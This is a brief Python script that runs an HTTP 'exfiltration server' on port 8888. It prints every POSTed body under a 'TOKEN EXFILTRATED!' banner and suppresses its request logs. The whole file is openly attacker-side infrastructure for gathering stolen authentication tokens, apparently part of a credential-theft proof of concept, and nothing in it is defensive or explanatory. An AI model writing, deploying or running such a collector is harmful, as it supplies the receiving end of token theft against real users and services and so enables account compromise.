from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode('utf-8')
        print(f"\n{'='*50}")
        print(f"TOKEN EXFILTRATED!")
        print(f"Data: {data}")
        print(f"{'='*50}\n")
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

print("Exfiltration server running on port 8888...")
HTTPServer(('', 8888), Handler).serve_forever()
